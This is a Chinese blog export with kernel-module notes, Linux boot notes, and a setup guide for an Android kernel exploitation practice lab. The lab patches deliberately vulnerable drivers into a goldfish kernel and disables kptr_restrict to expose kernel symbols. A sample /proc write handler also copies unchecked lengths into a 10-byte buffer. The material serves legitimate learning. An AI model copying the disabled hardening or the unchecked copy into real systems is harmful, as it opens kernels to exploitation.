<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;Hello, world\n&quot;</span>);    <span class="comment">// 以 KERN_ALERT 登记打印信息</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;Goodbye, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init); <span class="comment">// 初始化模块</span></span><br><span class="line">module_exit(hello_exit); <span class="comment">// 推出模块</span></span><br></pre></td></tr></table></figure>
<p>构建、安装及卸载</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make modules                      // 构建模块</span></span><br><span class="line">make -C /lib/modules/5.4.0-109-generic/build M=/home/embeded/LDD/fixed/misc-modules modules</span><br><span class="line">make[1]: Entering directory &#x27;/usr/src/linux-headers-5.4.0-109-generic&#x27;</span><br><span class="line">  CC [M]  /home/embeded/LDD/fixed/misc-modules/hello.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">WARNING: modpost: missing MODULE_LICENSE() in /home/embeded/LDD/fixed/misc-modules/hello.o</span><br><span class="line">see include/linux/module.h for more information</span><br><span class="line">  CC [M]  /home/embeded/LDD/fixed/misc-modules/hello.mod.o</span><br><span class="line">  LD [M]  /home/embeded/LDD/fixed/misc-modules/hello.ko</span><br><span class="line">make[1]: Leaving directory &#x27;/usr/src/linux-headers-5.4.0-109-generic&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">hello.c   hello.mod    hello.mod.o  Makefile       Module.symvers</span><br><span class="line">hello.ko  hello.mod.c  hello.o      modules.order</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo insmod hello.ko              // 安装模块</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">lsmod | grep hello                // 查看模块</span></span><br><span class="line">hello                  16384  0</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo rmmod hello.ko               // 卸载模块</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dmesg                             // 查看 KERNEL 信息</span></span><br><span class="line">[412294.031622] Hello, world</span><br><span class="line">[412340.803510] Goodbye, cruel world</span><br></pre></td></tr></table></figure>

<h2 id="内核模块"><a href="#内核模块" class="headerlink" title="内核模块"></a>内核模块</h2><p><strong>内核模块 vs 应用程序</strong><br>每个内核模块只注册自己以便于服务将来的请求，其初始化函数立刻终止</p>
<p><strong>模块可以注册哪些设备</strong><br>模块可以注册很多不同设施，包括不同类型的设备，如串口、&#x2F;proc 文件、执行域</p>
<p><strong>用户空间构建模块</strong><br>用户空间驱动的好处：</p>
<ol>
<li>拥有完整的 C 库</li>
<li>可以在驱动代码上运行常用调试器</li>
<li>能够简单的杀掉用户空间驱动</li>
<li>用户内存可交换，非运行不会占用 RAM</li>
</ol>
<p>如 USB 驱动</p>
<p>用户空间驱动的缺点：</p>
<ol>
<li>无法使用中断</li>
<li>只能通过内存映射 &#x2F;dev&#x2F;mem 使用 DMA </li>
<li>响应时间慢</li>
<li>重要设备不能在用户空间处理</li>
</ol>
<h2 id="字符驱动"><a href="#字符驱动" class="headerlink" title="字符驱动"></a>字符驱动</h2><h3 id="字符设备注册"><a href="#字符设备注册" class="headerlink" title="字符设备注册"></a>字符设备注册</h3><p>设备编号</p>
<p>主设备编号标识设备相连的驱动，副设备编号被决定引用哪个设备</p>
<p>分配和释放设备编号</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">int register_chrdev_region(dev_t first, unsigned int count, const char *name)</span><br><span class="line"></span><br><span class="line">- first 起始设备编号，次编号部分常常是 0</span><br><span class="line">- count 请求的连续设备编号的总数</span><br></pre></td></tr></table></figure>

<p>注册字符设备的方法</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;linux/fs.h&gt;</span></span><br><span class="line">int register_chrdev(unsigned int major, const char * name, const struct file_operations *fops)</span><br><span class="line">- major 主设备编号</span><br><span class="line">- name 设备名称</span><br><span class="line">- fops 文件操作函数</span><br><span class="line"></span><br><span class="line">如果主设备号为 0 则会分配一个主设备号</span><br></pre></td></tr></table></figure>



<h3 id="创建可读可写-proc-入口"><a href="#创建可读可写-proc-入口" class="headerlink" title="创建可读可写 proc 入口"></a>创建可读可写 proc 入口</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">static inline struct proc_dir_entry *proc_create(</span><br><span class="line">	const char *name, umode_t mode, struct proc_dir_entry *parent,</span><br><span class="line">	const struct file_operations *proc_fops)</span><br><span class="line"></span><br><span class="line">- name // 入口点名称</span><br><span class="line">- mode // 入口文件访问模式，也可以理解为权限</span><br><span class="line">- parent // 父入口点</span><br><span class="line">- proc_fops // proc 入口点文件操作结构</span><br><span class="line"></span><br><span class="line">// 文件操作接口，可以只使用部分</span><br><span class="line">struct file_operations &#123;</span><br><span class="line">	struct module *owner;</span><br><span class="line">	loff_t (*llseek) (struct file *, loff_t, int);</span><br><span class="line">	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);</span><br><span class="line">	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);</span><br><span class="line">	ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t);</span><br><span class="line">	ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t);</span><br><span class="line">	int (*readdir) (struct file *, void *, filldir_t);</span><br><span class="line">	unsigned int (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);</span><br><span class="line">	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);</span><br><span class="line">	int (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">	int (*open) (struct inode *, struct file *);</span><br><span class="line">	int (*flush) (struct file *, fl_owner_t id);</span><br><span class="line">	int (*release) (struct inode *, struct file *);</span><br><span class="line">	int (*fsync) (struct file *, loff_t, loff_t, int datasync);</span><br><span class="line">	int (*aio_fsync) (struct kiocb *, int datasync);</span><br><span class="line">	int (*fasync) (int, struct file *, int);</span><br><span class="line">	int (*lock) (struct file *, int, struct file_lock *);</span><br><span class="line">	ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);</span><br><span class="line">	unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);</span><br><span class="line">	int (*check_flags)(int);</span><br><span class="line">	int (*flock) (struct file *, int, struct file_lock *);</span><br><span class="line">	ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);</span><br><span class="line">	ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);</span><br><span class="line">	int (*setlease)(struct file *, long, struct file_lock **);</span><br><span class="line">	long (*fallocate)(struct file *file, int mode, loff_t offset,</span><br><span class="line">			  loff_t len);</span><br><span class="line">	int (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>代码</strong><br>创建文件在 <code>/proc</code> 下, </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">proc_create(<span class="string">&quot;hello&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br></pre></td></tr></table></figure>

<p>构建相应的文件操作结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_fops</span> =</span> &#123;</span><br><span class="line">    read:    read_proc</span><br><span class="line">    write:  write_proc</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>添加相应的文件处理函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write_proc</span><span class="params">(<span class="keyword">struct</span> file* filp, <span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> * offp)</span></span><br><span class="line">&#123;</span><br><span class="line">    copy_from_user(msg, buf, count);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;In write&quot;</span>);</span><br><span class="line">    len = count;</span><br><span class="line">    temp = len;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read_proc</span><span class="params">(<span class="keyword">struct</span> file* filp, <span class="type">char</span> *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; temp)</span><br><span class="line">        count = temp;</span><br><span class="line">    temp = temp-count;</span><br><span class="line">    copy_to_user(buf, msg, count);</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        temp = len;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_proc_entry</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;hello&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br><span class="line">    msg = kmalloc(<span class="number">10</span>*<span class="keyword">sizeof</span>(<span class="type">char</span>), GFP_KERNEL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加初始化和清除模块函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">proc_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    create_new_proc_entry();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">proc_cleanup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    remove_proc_entry(<span class="string">&quot;hello&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    kfree(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>AndroidKernelExploitationPlayground</title>
    <url>/2022/05/17/AndroidKernelExploitationPlayground/</url>
    <content><![CDATA[<span id="more"></span>

<p>本文主要参考 <a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground">AndroidKernelExploitationPlayground
</a></p>
<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="工具获取"><a href="#工具获取" class="headerlink" title="工具获取"></a>工具获取</h3><p><strong>平台编译工具</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6</span><br></pre></td></tr></table></figure>
<p>下载 Android sdk</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">wget http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz</span><br><span class="line">tar xvf android-sdk_r24.4.1-linux.tgz</span><br><span class="line">export PATH=$(pwd)/android-sdk-linux/tools:$PATH</span><br></pre></td></tr></table></figure>
<p><strong>Patch 内核</strong><br>模拟器内核允许调试符号以及在内核树中构建了漏洞</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">git clone https://android.googlesource.com/kernel/goldfish</span><br><span class="line">git clone https://github.com/Fuzion24/AndroidKernelExploitationPlayground.git kernel_exploit_challenges</span><br><span class="line">cd goldfish/ &amp;&amp; git checkout -t origin/android-goldfish-3.4</span><br><span class="line">git am --signoff &lt; ../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch</span><br><span class="line">cd .. &amp;&amp; ln -s $(pwd)/kernel_exploit_challenges/ goldfish/drivers/vulnerabilities</span><br></pre></td></tr></table></figure>

<h3 id="构建内核"><a href="#构建内核" class="headerlink" title="构建内核"></a>构建内核</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 设置架构为 arm，交叉编译环境为 arm-linux-androideabi-</span><br><span class="line">export ARCH=arm SUBARCH=arm CROSS_COMPILE=arm-linux-androideabi-</span><br><span class="line"></span><br><span class="line">// 添加环境变量到本地编译工具</span><br><span class="line">export PATH=$(pwd)/arm-linux-androideabi-4.6/bin/:$PATH</span><br><span class="line"></span><br><span class="line">// 构建内核</span><br><span class="line">cd goldfish &amp;&amp; make goldfish_armv7_defconfig &amp;&amp; make -j4</span><br></pre></td></tr></table></figure>

<h3 id="运行模拟器"><a href="#运行模拟器" class="headerlink" title="运行模拟器"></a>运行模拟器</h3><p>首先下载对应的工具 和 系统镜像<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205171557031.png"><br>可以看到我们能够运行的系统镜像 target 和 tag</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">android list targets</span></span><br><span class="line">Available Android targets:</span><br><span class="line">----------</span><br><span class="line">id: 1 or &quot;android-19&quot;</span><br><span class="line">     Name: Android 4.4.2</span><br><span class="line">     Type: Platform</span><br><span class="line">     API level: 19</span><br><span class="line">     Revision: 4</span><br><span class="line">     Skins: HVGA, QVGA, WQVGA400, WQVGA432, WSVGA, WVGA800 (default), WVGA854, WXGA720, WXGA800, WXGA800-7in</span><br><span class="line"> Tag/ABIs : google_apis/armeabi-v7a</span><br></pre></td></tr></table></figure>
<p>创建模拟器，并运行</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">goldfish$ </span><span class="language-bash">android create avd --force -t 1 --tag <span class="string">&quot;google_apis&quot;</span> -n kernel_challenges</span></span><br><span class="line">Auto-selecting single ABI armeabi-v7a</span><br><span class="line">Android 4.4.2 is a basic Android platform.</span><br><span class="line">Do you wish to create a custom hardware profile [no]</span><br><span class="line">Created AVD &#x27;kernel_challenges&#x27; based on Android 4.4.2, Google apis ARM (armeabi-v7a) processor,</span><br><span class="line">with the following hardware config:</span><br><span class="line">hw.lcd.density=240</span><br><span class="line">hw.ramSize=512</span><br><span class="line">vm.heapSize=48</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">goldfish$ </span><span class="language-bash">emulator -show-kernel -kernel <span class="built_in">arch</span>/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</span></span><br></pre></td></tr></table></figure>

<p><strong>报错</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">emulator: error while loading shared libraries: libstdc++.so.6: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
<p>缺少 32 位库，执行以下命令即可</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">sudo apt install lib32stdc++6</span><br></pre></td></tr></table></figure>

<h3 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h3><p>在 goldfish 文件夹下之下以下命令</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">goldfish$ </span><span class="language-bash">arm-linux-androideabi-gdb vmlinux</span></span><br><span class="line">GNU gdb (GDB) 7.3.1-gg2</span><br><span class="line">Copyright (C) 2011 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;--host=x86_64-linux-gnu --target=arm-linux-android&quot;.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">Reading symbols from /home/embeded/Desktop/AndroidKernel/goldfish/vmlinux...done.</span><br><span class="line">(gdb) target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">get_empty_filp () at fs/file_table.c:105</span><br><span class="line">105	&#123;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">cpu_v7_do_idle () at arch/arm/mm/proc-v7.S:74</span><br><span class="line">74		mov	pc, lr</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>
<p><strong>报错</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">arm-linux-androideabi-gdb: error while loading shared libraries: libpython2.6.so.1.0: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
<p>缺少 python2.6 版本库，直接用 2.7 的链接一下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/lib/x86_64-linux-gnu/libpython2.7.so.1.0 /usr/lib/x86_64-linux-gnu/libpython2.6.so.1.0</span><br></pre></td></tr></table></figure>
<p><strong>⚠️</strong><br>可能下断掉之后看到的不是 <code>mov pc, lr </code>，这是因为利用的假设条件为我们能够获取内存中的符号信息，这些信息均存放在 <code>/proc/kallsyms</code> 文件中，在现有版本中内核都会限制查看符号，限制程度以 <code>/proc/sys/kernel/kptr_restricted</code> 表示，如果为 0，则无限制，如果为 1，则 root 权限无限制，如果为 2，则任何权限都无法获取符号信息，利用以下命令将其置位后就可以看到符号信息</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure>

<h2 id="1-array-index"><a href="#1-array-index" class="headerlink" title="1. array_index"></a>1. array_index</h2><p>This bug is meant to mimic the sock_diag bug CVE-2013-1763</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>Kernel</category>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 之 那一束光</title>
    <url>/2022/05/14/Linux-Kernel-%E4%B9%8B-%E9%82%A3%E4%B8%80%E6%9D%9F%E5%85%89/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="内核执行的第一步"><a href="#内核执行的第一步" class="headerlink" title="内核执行的第一步"></a>内核执行的第一步</h2><h3 id="首要步骤"><a href="#首要步骤" class="headerlink" title="首要步骤"></a>首要步骤</h3><p>在调用 <code>decompress_kernel</code> 后，程序跳转到解压缩之后的程序入口点 <code>arch/x86/kernel/head_64.S</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 修复重载 gdt ldt</span><br><span class="line">call	startup_64_setup_env</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call	__startup_64</span><br><span class="line">    // 确认加载偏移 - 由 kaslr 导致</span><br><span class="line">    // 这里的 _text = __START_KERNEL</span><br><span class="line">    // #define _START_KERNEL    (__START_KERNEL_map + __PHYSICAL_START)</span><br><span class="line">    // #define __PHYSICAL_START  ALIGN(CONFIG_PHYSICAL_START, CONFIG_PHYSICAL_ALIGN)</span><br><span class="line">    load_delta = physaddr - (unsigned long)(_text - __START_KERNEL_map);</span><br><span class="line">    // 修正页表基地址</span><br><span class="line">    pgd = fixup_pointer(&amp;early_top_pgt, physaddr);</span><br><span class="line">    pmd = fixup_pointer(level2_fixmap_pgt, physaddr);</span><br><span class="line">    pud = fixup_pointer(&amp;level3_kernel_pgt, physaddr);</span><br><span class="line"></span><br><span class="line">// 初期页表映射</span><br><span class="line">addq	$(early_top_pgt - __START_KERNEL_map), %rax</span><br><span class="line">jmp 1f</span><br><span class="line"></span><br><span class="line">// 设置物理地址</span><br><span class="line">movq	%rcx, %cr4</span><br><span class="line"></span><br><span class="line">/* Setup early boot stage 4-/5-level pagetables. */</span><br><span class="line">addq	phys_base(%rip), %rax</span><br><span class="line"></span><br><span class="line">// 重新加载 GDT</span><br><span class="line">lgdt	early_gdt_descr(%rip)</span><br><span class="line"></span><br><span class="line">// 设置 初始化栈</span><br><span class="line">movq initial_stack(%rip), %rsp</span><br><span class="line"></span><br><span class="line">// 设置 IDT</span><br><span class="line">call	early_setup_idt</span><br><span class="line"></span><br><span class="line">// 检查 CPU 并对 cr0 寄存器置位</span><br><span class="line">movl	$0x80000001, %eax</span><br><span class="line">cpuid</span><br><span class="line">movl	$CR0_STATE, %eax</span><br><span class="line">/* Make changes effective */</span><br><span class="line">movq	%rax, %cr0</span><br><span class="line"></span><br><span class="line">// 保存实模式下 boot param，并跳转到 c 代码</span><br><span class="line">movq    initial_code(%rip),%rax</span><br><span class="line">pushq    $0</span><br><span class="line">pushq    $__KERNEL_CS</span><br><span class="line">pushq    %rax</span><br><span class="line">lretq</span><br></pre></td></tr></table></figure>
<h3 id="C-函数检查"><a href="#C-函数检查" class="headerlink" title="C 函数检查"></a>C 函数检查</h3><p>现在来到 <code>/arch/x86/kernel/head64.c</code><br>这里的 initial_code 是 <code>X86_64_start_kernel</code>，大致代码如下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 检查模块虚拟地址与内核虚拟地址之间的关系</span><br><span class="line">BUILD_BUG_ON(MODULES_VADDR &lt; __START_KERNEL_map);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 存储多CPU中的 cr4 的 shadow copy，因为上下文切换可能会修改 cr4 中的位</span><br><span class="line">cr4_init_shadow();</span><br><span class="line"></span><br><span class="line">// 重置全局页目录项以及清空 BSS 段</span><br><span class="line">reset_early_page_tables();</span><br><span class="line">clear_bss();</span><br><span class="line">clear_page(init_top_pgt);</span><br></pre></td></tr></table></figure>
<p><strong>初期中断与异常处理</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">idt_setup_early_handler();</span><br></pre></td></tr></table></figure>
<p>中断是由硬件或者软件发出的事件，CPU 接收事件后会将控制流转到 <strong>中断处理程序</strong>中，一般中断分成三类：</p>
<ul>
<li>硬件中断：硬件有任何事件发生时</li>
<li>软件中断：软件需要内核提供功能时，一般是系统调用</li>
<li>异常：CPU 检测到错误时，如除零错误或者不存在的内存页</li>
</ul>
<p>通常使用数字表示异常和中断类型，称之为<strong>向量号</strong>，一般来说前32位表示异常，其余表示用户自定义的中断</p>
<p>中断数据处理的结构类似于全局描述符表 GDT，也存在中断描述符表<code>IDT</code>，中断描述符表寄存器 <code>idtr</code>，以及加载基地址的操作指令 <code>lidt</code></p>
<p>即如果触发中断，则将会从从 <code>idr</code> 中找到 <code>IDT</code> 的基址，随后通过向量号搜索描述符的起始地址，额外的，一般将IDT中的每一项称之为 <code>gate</code> 即门</p>
<p>64位下 gate 的结构是</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">127                                                                             96</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                                                               |</span><br><span class="line">|                                Reserved                                       |</span><br><span class="line">|                                                                               |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">95                                                                              64</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                                                               |</span><br><span class="line">|                               Offset 63..32                                   |</span><br><span class="line">|                                                                               |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">63                               48 47      46  44   42    39             34    32</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                  |       |  D  |   |     |      |   |   |     |</span><br><span class="line">|       Offset 31..16              |   P   |  P  | 0 |Type |0 0 0 | 0 | 0 | IST |</span><br><span class="line">|                                  |       |  L  |   |     |      |   |   |     |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">31                                   15 16                                      0</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                      |                                        |</span><br><span class="line">|          Segment Selector            |                 Offset 15..0           |</span><br><span class="line">|                                      |                                        |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p><strong>rest of prepare</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 获取实模式 boot_params，两项工作</span><br><span class="line">// 复制内容 与 获取命令行</span><br><span class="line">copy_bootdata(__va(real_mode_data));</span><br><span class="line"></span><br><span class="line">// 加载处理器微代码</span><br><span class="line">load_ucode_bsp();</span><br><span class="line"></span><br><span class="line">// 将 init_top_pgt 最后一项设置为内核高地址映射</span><br><span class="line">init_top_pgt[511] = early_top_pgt[511];</span><br></pre></td></tr></table></figure>

<h2 id="Start-kernel"><a href="#Start-kernel" class="headerlink" title="Start_kernel"></a>Start_kernel</h2><p>此函数的主要目的是完成内核初始化并启动 1 号进程</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>源码入口：<code>init/main.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 设置 canary 以检测栈溢出</span><br><span class="line">set_task_stack_end_magic(&amp;init_task);</span><br><span class="line"></span><br><span class="line">// 初始化控制组信息以及所有需要 early init 的子系统</span><br><span class="line">cgroup_init_early();</span><br><span class="line"></span><br><span class="line">// 激活第一个CPU，并设置状态</span><br><span class="line">boot_cpu_init();</span><br><span class="line"></span><br><span class="line">// 初始化页地址</span><br><span class="line">page_address_init();</span><br><span class="line"></span><br><span class="line">// 打印 内核版本信息</span><br><span class="line">// 🌰 Linux version 4.15.8 (simple@vps-simple) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-16) (GCC)) #19 SMP Mon Mar 19 18:50:28 CST 2018</span><br><span class="line">pr_notice(&quot;%s&quot;, linux_banner);</span><br><span class="line"></span><br><span class="line">// 依赖于体系结构的初始化</span><br><span class="line">setup_arch(&amp;command_line);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>体系架构初始化</strong><br>源码入口：<code>/arch/x86/kernel/setup.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 打印命令行</span><br><span class="line">// 🌰 Command line: root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr</span><br><span class="line">printk(KERN_INFO &quot;Command line: %s\n&quot;, boot_command_line);</span><br><span class="line"></span><br><span class="line">// 检测系统是否支持 OLPC</span><br><span class="line">olpc_ofw_detect();</span><br><span class="line"></span><br><span class="line">// 初始化调试功能</span><br><span class="line">idt_setup_early_traps();</span><br></pre></td></tr></table></figure>
<p>当中断发生后，栈内的格式是：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">    +-----------------------+</span><br><span class="line">    |                       |</span><br><span class="line">+40 |         SS            |</span><br><span class="line">+32 |         RSP           |</span><br><span class="line">+24 |        RFLAGS         |</span><br><span class="line">+16 |         CS            |</span><br><span class="line">+8  |         RIP           |</span><br><span class="line"> 0  |       Error Code      | &lt;---- rsp</span><br><span class="line">    |                       |</span><br><span class="line">    +-----------------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 搜集 CPU 及供应商信息</span><br><span class="line">early_cpu_init();</span><br><span class="line"></span><br><span class="line">// 初始化早期 ioremap</span><br><span class="line">early_ioremap_init();</span><br></pre></td></tr></table></figure>
<p>一般与设备实现通信有两种方式：</p>
<ul>
<li>I&#x2F;O 端口：通过 outb&#x2F;inb 指令实现</li>
<li>设备内存：将设备内存映射到内核地址空间，即当 CPU 读取物理内存时，能够读取到 I&#x2F;O 设备的物理 RAW 区域</li>
</ul>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 获取根设备的主次设备号</span><br><span class="line">// 主设备号识别驱动，次设备号表示设备</span><br><span class="line">ROOT_DEV = old_decode_dev(boot_params.hdr.root_dev);</span><br><span class="line"></span><br><span class="line">// 设置显示参数</span><br><span class="line">screen_info = boot_params.screen_info;</span><br><span class="line">edid_info = boot_params.edid_info;</span><br><span class="line">saved_video_mode = boot_params.hdr.vid_mode;</span><br><span class="line">bootloader_type = boot_params.hdr.type_of_loader;</span><br><span class="line">if ((bootloader_type &gt;&gt; 4) == 0xe) &#123;</span><br><span class="line">    bootloader_type &amp;= 0xf;</span><br><span class="line">    bootloader_type |= (boot_params.hdr.ext_loader_type+0x10) &lt;&lt; 4;</span><br><span class="line">&#125;</span><br><span class="line">bootloader_version  = bootloader_type &amp; 0xf;</span><br><span class="line">bootloader_version |= boot_params.hdr.ext_loader_ver &lt;&lt; 4;</span><br><span class="line"></span><br><span class="line">// 内存保留</span><br><span class="line">early_reserve_memory();</span><br><span class="line"></span><br><span class="line">// 